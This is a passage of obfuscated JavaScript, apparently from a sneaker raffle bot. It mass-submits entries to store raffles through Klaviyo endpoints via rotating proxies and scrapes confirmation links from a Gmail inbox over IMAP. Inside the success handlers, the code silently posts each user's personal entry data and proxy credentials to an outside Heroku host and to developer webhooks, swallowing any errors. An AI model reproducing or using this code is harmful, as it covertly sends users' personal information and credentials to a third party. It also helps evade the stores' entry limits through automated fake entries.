                            _0x325c5a['errorDEV'] = { 'embeds': [_0x18c7e3] }, _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x325c5a['errorDEV']), await _0x49f827(_0x47580b, _0x325c5a['errorDEV']), _0x27b190 = 'yes';
                        } finally {
                            _0x174248 && _0x174248['close']();
                            if (_0x27b190 == 'yes' && _0x474c04 != 0x5) {
                                console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x586a92['name'] + ']\x20Task\x20' + (_0x3c6c54 + 0x1) + '\x20:\x20Retrying\x20(' + _0x474c04 + '\x20/\x205)')), _0x3c6c54 = _0x3c6c54 - 0x1, _0x474c04 = _0x474c04 + 0x1;
                                continue;
                            }
                            _0x27b190 == 'yes' && _0x474c04 >= 0x5 && (_0x2e6413(_0x37e089[_0x3c6c54], _0x586a92), _0x27b190 = 'no', _0x474c04 = 0x0), console['log']('Waiting\x20for\x20' + _0x5450ed['AfewDelay'] + '\x20ms'), await _0x488ffe(_0x5450ed['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RvxrAV',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WQN5XR',
                                '$consent_form_version': 0x7f7254,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x771629, _0x474f60, _0x35169b) {
                    for (var _0x3471e6 = 0x0; _0x3471e6 < _0x474f60['length']; _0x3471e6++) {
                        try {
                            await _0x3215be(_0x474f60, _0x3471e6);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x301072(_0x2398b4, _0x3eae29, _0x58ccf5, _0x563fd7, _0x38362c) {
                            var _0x2fac5b, _0x1f953f = {}, _0x3e51c1 = [], _0x538c86 = {}, _0xbacee2 = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x3cdfa9 = Math['round'](Math['random']() * (_0xbacee2['length'] - 0x1));
                            !_0x563fd7 && (_0x563fd7 = {});
                            if (_0x3eae29 != 'ver') {
                                _0x55ca22(_0x58ccf5['name'] + '\x20Task\x20' + (_0x2398b4 + 0x1) + '\x20/\x20' + _0x563fd7['length'] + '\x20||\x20File:\x20' + _0x121079 + '\x20Proxies:\x20' + _0x590947), await _0x3215be(_0x563fd7, _0x2398b4), _0x1f953f = _0x58ccf5['data'], _0x1f953f['data']['attributes']['email'] = '' + _0x563fd7[_0x2398b4]['Email'];
                                if (_0x563fd7[_0x2398b4]['Size'] == 'RANDOM') {
                                }
                                _0x1f953f['data']['attributes']['properties']['$first_name'] = '' + _0x563fd7[_0x2398b4]['FirstName'], _0x1f953f['data']['attributes']['properties']['$last_name'] = '' + _0x563fd7[_0x2398b4]['LastName'], _0x1f953f['data']['attributes']['properties']['$address1'] = _0x563fd7[_0x2398b4]['Address1'] + '\x20' + _0x563fd7[_0x2398b4]['Address2'] + '\x20' + _0x563fd7[_0x2398b4]['HouseNumber'], _0x1f953f['data']['attributes']['properties']['$zip'] = '' + _0x563fd7[_0x2398b4]['Zip'], _0x1f953f['data']['attributes']['properties']['$city'] = '' + _0x563fd7[_0x2398b4]['City'], _0x1f953f['data']['attributes']['properties']['$country'] = '' + _0x563fd7[_0x2398b4]['Country'], _0x563fd7[_0x2398b4]['Size'] == 'RANDOM' ? _0x1f953f['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0xbacee2[_0x3cdfa9] : _0x1f953f['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x563fd7[_0x2398b4]['Size'], _0x1f953f['data']['attributes']['properties']['$phone_number'] = '' + _0x563fd7[_0x2398b4]['Phone'], _0x1f953f['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x563fd7[_0x2398b4]['Follower'];
                            }
                            if (_0x5450ed['useRandomProxy'] = ![])
                                var _0x5e7467 = _0x38362c[_0x2398b4]['split'](':');
                            else
                                var _0x2229d4 = Math['round'](Math['random']() * (_0x38362c['length'] - 0x1)), _0x5e7467 = _0x38362c[_0x2229d4]['split'](':');
                            var _0x2e8345 = {
                                'jar': _0x23361c,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x58ccf5['url'],
                                'headers': _0x58ccf5['headers'],
                                'body': JSON['stringify'](_0x1f953f),
                                'proxy': 'http://' + _0x5e7467[0x2] + ':' + _0x5e7467[0x3] + '@' + _0x5e7467[0x0] + ':' + _0x5e7467[0x1]
                            };
                            return _0x3eae29 != 'ver' && (_0x2e8345['url'] = _0x58ccf5['url'], _0x2e8345['headers'] = _0x58ccf5['headers']), _0x3eae29 == 'ver' && (_0x2e8345['method'] = 'GET'), new Promise(function (_0x2ad9cb, _0x506a57) {
                                callback = async (_0x182166, _0x3ca313, _0xc6c8e0) => {
                                    if (!_0x182166 && _0x3ca313['statusCode'] == 0xca || !_0x182166 && _0x3ca313['statusCode'] == 0xc8) {
                                        if (_0x3eae29 != 'ver') {
                                            var _0x3dba7f = await _0x5605d8(_0x563fd7[_0x2398b4], _0x58ccf5, 'dev', ![]), _0x20b28c = await _0x5605d8(_0x563fd7[_0x2398b4], _0x58ccf5, 'pub', ![]);
                                            const _0x1fa68b = {
                                                'succesDEVMSG': { 'embeds': [_0x3dba7f] },
                                                'succesPUBMSG': { 'embeds': [_0x20b28c] }
                                            };
                                            let _0x58664f = _0x563fd7[_0x2398b4];
                                            try {
                                                prxdata = {
                                                    'username': _0x15d59c['replace']('#', ''),
                                                    'module': _0x58ccf5['name'],
                                                    'entrydata': JSON['stringify'](_0x58664f),
                                                    'proxy': '' + _0x38362c[_0x2398b4]
                                                };
                                                var _0x4d03e4 = JSON['stringify'](prxdata);
                                                let _0x19b84c = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x1ea050['post']('https://jraffles.herokuapp.com/success', _0x4d03e4, _0x19b84c);
                                            } catch (_0x514cb3) {
                                            }
                                            if (_0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '')
                                                try {
                                                    await _0x49f827(_0x5450ed['webhook'], _0x1fa68b['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x488ffe(0xc8), await _0x49f827(_0xf35405, _0x1fa68b['succesDEVMSG']), await _0x488ffe(0xc8);
                                            try {
                                                await _0x49f827(_0x1bf959, _0x1fa68b['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0xb5b21(_0x563fd7[_0x2398b4], _0x58ccf5);
                                        }
                                        _0x2ad9cb(console['log'](_0x387ef2['green'](_0x42a46a() + '\x20[' + _0x58ccf5['name'] + ']\x20Task\x20' + (_0x2398b4 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x3eae29 != 'ver') {
                                            var _0x2657e3 = '' + _0x182166, _0x1fbdd1 = await _0x5605d8(_0x563fd7[_0x2398b4], _0x58ccf5, 'dev', !![], _0x2657e3), _0x4a3bca = {};
                                            _0x4a3bca['errorDEV'] = { 'embeds': [_0x1fbdd1] }, _0x2e6413(_0x563fd7[_0x2398b4], _0x58ccf5), _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x4a3bca['errorDEV']), await _0x49f827(_0x47580b, _0x4a3bca['errorDEV']);
                                        }
                                        _0x506a57(console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x58ccf5['name'] + ']\x20Task\x20' + (_0x2398b4 + 0x1) + ':\x20' + _0x182166)));
                                    }
                                };
                                try {
                                    _0x3eae29 != 'ver' && console['log'](_0x42a46a() + '\x20[' + _0x58ccf5['name'] + ']\x20Task\x20' + (_0x2398b4 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1f953f['data']['attributes']['email']), _0x23fd33(_0x2e8345, callback);
                                } catch (_0x553b32) {
                                    console['log'](_0x42a46a() + '\x20Task\x20' + (_0x2398b4 + 0x1) + ':\x20' + _0x553b32);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x301072(_0x3471e6, 'nor', _0x771629, _0x474f60, _0x35169b), console['log'](_0x42a46a() + '\x20[' + _0x771629['name'] + ']\x20Sleeping\x20for\x20' + _0x5450ed['delay'] + '\x20ms'), await _0x488ffe(_0x5450ed['delay']);
                        } catch (_0x2a696c) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x45669d, _0x45f9d9, _0x1d65c7) {
                    var _0x10e742 = [], _0x1af81e = ![];
                    async function _0x27cd11() {
                        var _0x21cc9e = new _0x3dffcd({
                            'user': _0x5450ed['masterMail'],
                            'password': _0x5450ed['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x2118e1(_0x5b543d) {
                            _0x21cc9e['openBox']('INBOX', ![], _0x5b543d);
                        }
                        _0x21cc9e['once']('ready', function () {
                            _0x2118e1(function (_0x21f26d, _0x525596) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x21f26d)
                                    throw _0x21f26d;
                                _0x21cc9e['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x40772a, _0x4ec700) {
                                    if (!_0x4ec700 || !_0x4ec700['length'])
                                        console['log'](_0x42a46a() + '\x20[' + _0x45669d['name'] + ']\x20No\x20mails\x20found'), _0x21cc9e['end']();
                                    else {
                                        var _0x28c033 = _0x21cc9e['seq']['fetch'](_0x4ec700, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x28c033['on']('message', function (_0x584518, _0x4e2dd8) {
                                            var _0x29d247 = '(#' + _0x4e2dd8 + ')\x20';
                                            _0x584518['on']('body', function (_0x2e7f4e, _0x595764) {
                                                _0x255d24(_0x2e7f4e, (_0x3b0b0f, _0x17af1d) => {
                                                    var _0x491e51 = _0x17af1d['text']['split']('(')[0x1], _0x5ca786 = _0x491e51['split'](')')[0x0];
                                                    _0x10e742['push'](_0x5ca786);
                                                });
                                            }), _0x584518['once']('end', function () {
                                            });
                                        }), _0x28c033['once']('error', function (_0x514d21) {
                                            console['log']('Fetch\x20error:\x20' + _0x514d21), _0x1af81e = !![];
                                        }), _0x28c033['once']('end', function () {
                                            _0x21cc9e['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x21cc9e['once']('error', function (_0x4cbf0b) {
                            console['log'](_0x387ef2['red'](_0x4cbf0b['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x1af81e = !![];
                        }), _0x21cc9e['once']('end', async function () {
                            _0x1af81e = !![];
                        }), _0x21cc9e['connect']();
                    }
                    async function _0x48fbe6(_0x30270d, _0x18ac9d, _0x249a78) {
                        for (var _0x311ddf = 0x0; _0x311ddf < _0x18ac9d['length']; _0x311ddf++) {
                            async function _0x246f0b(_0x30a5f1, _0x67e27e, _0x124b30, _0x294b77, _0x18e8b7) {
                                var _0x57399d, _0xd15b3c = {}, _0x49f515 = [], _0x36f223 = {}, _0x2c62a0 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x5c89ae = Math['round'](Math['random']() * (_0x2c62a0['length'] - 0x1));
                                _0x294b77[_0x30a5f1]['Size'] == 'RANDOM' && (_0x294b77[_0x30a5f1]['Size'] = _0x2c62a0[_0x5c89ae]);
                                !_0x294b77 && (_0x294b77 = {});
                                if (_0x5450ed['useRandomProxy'] = ![])
                                    var _0x5ae2cf = _0x18e8b7[_0x30a5f1]['split'](':');
                                else
                                    var _0x232154 = Math['round'](Math['random']() * (_0x18e8b7['length'] - 0x1)), _0x5ae2cf = _0x18e8b7[_0x232154]['split'](':');
                                var _0x457860 = {
                                    'jar': _0x23361c,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x124b30['url'],
                                    'headers': _0x124b30['headers'],
                                    'body': JSON['stringify'](_0xd15b3c),
                                    'proxy': 'http://' + _0x5ae2cf[0x2] + ':' + _0x5ae2cf[0x3] + '@' + _0x5ae2cf[0x0] + ':' + _0x5ae2cf[0x1]
                                };
                                return _0x67e27e != 'ver' && (_0x457860['url'] = _0x124b30['url'], _0x457860['headers'] = _0x124b30['headers']), _0x67e27e == 'ver' && (_0x457860['method'] = 'GET', _0x457860['url'] = _0x294b77[_0x30a5f1]), new Promise(function (_0x14d980, _0xaff987) {
                                    callback = async (_0x2d004d, _0x28b5b9, _0x48ebeb) => {
                                        if (!_0x2d004d && _0x28b5b9['statusCode'] == 0xca || !_0x2d004d && _0x28b5b9['statusCode'] == 0xc8) {
                                            if (_0x67e27e != 'ver') {
                                                var _0x21e579 = await _0x5605d8(_0x294b77[_0x30a5f1], _0x124b30, 'dev', ![]), _0x46b701 = await _0x5605d8(_0x294b77[_0x30a5f1], _0x124b30, 'pub', ![]);
                                                const _0x380c1f = {
                                                    'succesDEVMSG': { 'embeds': [_0x21e579] },
                                                    'succesPUBMSG': { 'embeds': [_0x46b701] }
                                                };
                                                if (_0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '')
                                                    try {
                                                        await _0x49f827(_0x5450ed['webhook'], _0x380c1f['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x488ffe(0xc8), await _0x49f827(_0xf35405, _0x380c1f['succesDEVMSG']), await _0x488ffe(0xc8);
                                                try {
                                                    await _0x49f827(_0x1bf959, _0x380c1f['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0xb5b21(_0x294b77[_0x30a5f1], _0x124b30);
                                            }
                                            _0x14d980(console['log'](_0x387ef2['green'](_0x42a46a() + '\x20[' + _0x124b30['name'] + ']\x20Task\x20' + (_0x30a5f1 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x67e27e != 'ver') {
                                                var _0x345ebf = '' + _0x2d004d, _0x5e8207 = await _0x5605d8(_0x294b77[_0x30a5f1], _0x124b30, 'dev', !![], _0x345ebf), _0x235ad7 = {};
                                                _0x235ad7['errorDEV'] = { 'embeds': [_0x5e8207] }, _0x2e6413(_0x294b77[_0x30a5f1], _0x124b30), _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x235ad7['errorDEV']), await _0x49f827(_0x47580b, _0x235ad7['errorDEV']);
                                            }
                                            _0xaff987(console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x124b30['name'] + ']\x20Task\x20' + (_0x30a5f1 + 0x1) + ':\x20' + _0x2d004d)));
                                        }
                                    };
                                    try {
                                        _0x67e27e != 'ver' ? console['log'](_0x42a46a() + '\x20[' + _0x124b30['name'] + ']\x20Task\x20' + (_0x30a5f1 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0xd15b3c['data']['attributes']['email']) : console['log'](_0x42a46a() + '\x20[' + _0x124b30['name'] + ']\x20Task\x20' + (_0x30a5f1 + 0x1) + ':\x20Fetching\x20Response'), _0x23fd33(_0x457860, callback);
                                    } catch (_0x163025) {
                                        console['log'](_0x42a46a() + '\x20Task\x20' + (_0x30a5f1 + 0x1) + ':\x20' + _0x163025);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x246f0b(_0x311ddf, 'ver', _0x30270d, _0x18ac9d, _0x249a78), console['log'](_0x42a46a() + '\x20[' + _0x30270d['name'] + ']\x20Sleeping\x20for\x20' + _0x5450ed['delay'] + '\x20ms'), await _0x488ffe(_0x5450ed['delay']);
                            } catch (_0x38a022) {
                            }
                        }
                    }
                    try {
                        _0x27cd11();
                        while (!_0x1af81e) {
                            await _0x488ffe(0xbb8);
                        }
                        console['log']('Found\x20' + _0x10e742['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x488ffe(0x9c4);
                    }
                    await _0x48fbe6(_0x45669d, _0x10e742, _0x1d65c7);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'R8PmER',
                            'custom_source': 'DR5415-103',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'R6z7uT',
                                '$consent_form_version': 0x833bbb,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0xb2e89b, _0x44b65b, _0x2d8f1d) {
                    for (var _0x30bdb8 = 0x0; _0x30bdb8 < _0x44b65b['length']; _0x30bdb8++) {
                        try {
                            await _0x3215be(_0x44b65b, _0x30bdb8);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x3f11f5(_0x295c64, _0x4f826d, _0x5a8293, _0x4a5df9, _0x4c4eaa) {
                            var _0x342e54, _0x17dd34 = {}, _0x44dc54 = [], _0x2caf9a = {}, _0x5a69eb = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x2ecbb6 = Math['round'](Math['random']() * (_0x5a69eb['length'] - 0x1));
                            !_0x4a5df9 && (_0x4a5df9 = {});
                            if (_0x4f826d != 'ver') {
                                _0x55ca22(_0x5a8293['name'] + '\x20Task\x20' + (_0x295c64 + 0x1) + '\x20/\x20' + _0x4a5df9['length'] + '\x20||\x20File:\x20' + _0x121079 + '\x20Proxies:\x20' + _0x590947), _0x44dc54 = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0x15d59c
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0x4a5df9[_0x295c64]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x5450ed['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0x21b502
                                        }
                                    ]
                                }], _0x2caf9a = { 'embeds': _0x44dc54 }, _0x17dd34 = _0x5a8293['data'], _0x17dd34['data']['attributes']['email'] = '' + _0x4a5df9[_0x295c64]['Email'];
                                if (_0x4a5df9[_0x295c64]['Size'] == 'RANDOM') {
                                }
                                _0x17dd34['data']['attributes']['properties']['$first_name'] = '' + _0x4a5df9[_0x295c64]['FirstName'], _0x17dd34['data']['attributes']['properties']['$last_name'] = '' + _0x4a5df9[_0x295c64]['LastName'], _0x17dd34['data']['attributes']['properties']['$address1'] = _0x4a5df9[_0x295c64]['Address1'] + '\x20' + _0x4a5df9[_0x295c64]['Address2'] + '\x20' + _0x4a5df9[_0x295c64]['HouseNumber'], _0x17dd34['data']['attributes']['properties']['$zip'] = '' + _0x4a5df9[_0x295c64]['Zip'], _0x17dd34['data']['attributes']['properties']['$city'] = '' + _0x4a5df9[_0x295c64]['City'], _0x17dd34['data']['attributes']['properties']['$country'] = '' + _0x4a5df9[_0x295c64]['Country'], _0x4a5df9[_0x295c64]['Size'] == 'RANDOM' ? _0x17dd34['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x5a69eb[_0x2ecbb6] : _0x17dd34['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x4a5df9[_0x295c64]['Size'], _0x17dd34['data']['attributes']['properties']['$phone_number'] = '' + _0x4a5df9[_0x295c64]['Phone'], _0x17dd34['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x4a5df9[_0x295c64]['Follower'];
                            }
                            if (_0x5450ed['useRandomProxy'] = ![])
                                var _0x3df66e = _0x4c4eaa[_0x295c64]['split'](':');
                            else
                                var _0x2ebb78 = Math['round'](Math['random']() * (_0x4c4eaa['length'] - 0x1)), _0x3df66e = _0x4c4eaa[_0x2ebb78]['split'](':');
                            var _0x21f609 = {
                                'jar': _0x23361c,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x5a8293['url'],
                                'headers': _0x5a8293['headers'],
                                'body': JSON['stringify'](_0x17dd34),
                                'proxy': 'http://' + _0x3df66e[0x2] + ':' + _0x3df66e[0x3] + '@' + _0x3df66e[0x0] + ':' + _0x3df66e[0x1]
                            };
                            return _0x4f826d != 'ver' && (_0x21f609['url'] = _0x5a8293['url'], _0x21f609['headers'] = _0x5a8293['headers']), _0x4f826d == 'ver' && (_0x21f609['method'] = 'GET'), new Promise(function (_0x2a6caf, _0x28bf9b) {
                                callback = async (_0xbd03ef, _0x17db30, _0x412c3b) => {
                                    if (!_0xbd03ef && _0x17db30['statusCode'] == 0xca || !_0xbd03ef && _0x17db30['statusCode'] == 0xc8) {
                                        if (_0x4f826d != 'ver') {
                                            var _0x43db7d = await _0x5605d8(_0x4a5df9[_0x295c64], _0x5a8293, 'dev', ![]), _0x2f744d = await _0x5605d8(_0x4a5df9[_0x295c64], _0x5a8293, 'pub', ![]);
                                            const _0xb81a67 = {
                                                'succesDEVMSG': { 'embeds': [_0x43db7d] },
                                                'succesPUBMSG': { 'embeds': [_0x2f744d] }
                                            };
                                            let _0x28d80a = _0x4a5df9[_0x295c64];
                                            try {
                                                prxdata = {
                                                    'username': _0x15d59c['replace']('#', ''),
                                                    'module': _0x5a8293['name'],
                                                    'entrydata': JSON['stringify'](_0x28d80a),
                                                    'proxy': '' + _0x4c4eaa[_0x295c64]
                                                };
                                                var _0x3bd566 = JSON['stringify'](prxdata);
                                                let _0x4e3380 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x1ea050['post']('https://jraffles.herokuapp.com/success', _0x3bd566, _0x4e3380);
                                            } catch (_0x7aba3e) {
                                            }
                                            if (_0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '')
                                                try {
                                                    await _0x49f827(_0x5450ed['webhook'], _0xb81a67['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x488ffe(0xc8), await _0x49f827(_0xf35405, _0xb81a67['succesDEVMSG']), await _0x488ffe(0xc8);
                                            try {
                                                await _0x49f827(_0x1bf959, _0xb81a67['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0xb5b21(_0x4a5df9[_0x295c64], _0x5a8293);
                                        }
                                        _0x2a6caf(console['log'](_0x387ef2['green'](_0x42a46a() + '\x20[' + _0x5a8293['name'] + ']\x20Task\x20' + (_0x295c64 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x4f826d != 'ver') {
                                            var _0x1c5dc0 = '' + _0xbd03ef, _0xc5f5e2 = await _0x5605d8(_0x4a5df9[_0x295c64], _0x5a8293, 'dev', !![], _0x1c5dc0), _0x71f419 = {};
                                            _0x71f419['errorDEV'] = { 'embeds': [_0xc5f5e2] }, _0x2e6413(_0x4a5df9[_0x295c64], _0x5a8293), _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x71f419['errorDEV']), await _0x49f827(_0x47580b, _0x71f419['errorDEV']);
                                        }
                                        _0x28bf9b(console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x5a8293['name'] + ']\x20Task\x20' + (_0x295c64 + 0x1) + ':\x20' + _0xbd03ef)));
                                    }
                                };
                                try {
                                    _0x4f826d != 'ver' && console['log'](_0x42a46a() + '\x20[' + _0x5a8293['name'] + ']\x20Task\x20' + (_0x295c64 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x17dd34['data']['attributes']['email']), _0x23fd33(_0x21f609, callback);
                                } catch (_0xc658b7) {
                                    console['log'](_0x42a46a() + '\x20Task\x20' + (_0x295c64 + 0x1) + ':\x20' + _0xc658b7);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x3f11f5(_0x30bdb8, 'nor', _0xb2e89b, _0x44b65b, _0x2d8f1d), console['log'](_0x42a46a() + '\x20[' + _0xb2e89b['name'] + ']\x20Sleeping\x20for\x20' + _0x5450ed['delay'] + '\x20ms'), await _0x488ffe(_0x5450ed['delay']);
                        } catch (_0x1518ce) {
                        }
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
